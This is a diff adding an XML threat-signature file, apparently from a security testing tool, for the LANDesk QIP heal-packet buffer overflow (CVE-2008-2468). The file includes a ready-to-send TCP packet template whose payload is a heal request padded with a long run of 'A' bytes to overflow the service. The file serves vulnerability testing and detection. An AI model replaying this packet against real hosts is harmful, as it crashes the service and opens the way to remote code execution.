@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="LANDesk Management Suite QIP Service Heal Packet Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a memory corruption vulnerability in LANDesk QIP service. The vulnerability is due to insufficient validation when processing specially crafted heal requests. A remote unauthenticated attacker can leverage this vulnerability to inject and execute arbitrary code on the target host with System level privileges. In case of a successful exploitation, the attacker can inject and execute arbitrary code with the privileges of the affected service, normally System. The behaviour of the target will depend on the injected code. In the case of an unsuccessful code execution attack, the service will be terminated due to memory corruption, causing Denial of Service."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="QIP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="LANDesk"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="LANDesk_Management_Suite/LANDesk_Security_Suite/LANDesk_Server_Manager"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="LANDesk_Management_Suite_8.8_and_prior/LANDesk_Security_Suite_8.8_and_prior/LANDesk_Server_Manager_8.8_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2008-2468"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="7af79d98fa525fbb5cf53761dd8b4e26"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634001167224318741"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1264501805" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="M"/>
+    <NamedVar name="QIPdestPort" type="ImperfectControls.Port" value="null" index="P"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="M"/>
+      <for index="P"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:94:8D:6E" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="9575" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="3E78" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="34100" destPort="$QIPdestPort" SeqNumber="CA51BAD7" AckNumber="28FF3AA0" HeaderLength="08" WindowSize="002E" Checksum="07F6" UrgentPointer="0000" Options="0101080A312C2FAF00000000" Payload="7364667800001032F000040810246865616C2410000000000000000000000000000000000010000000000000000000000000414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+</threatSignature>
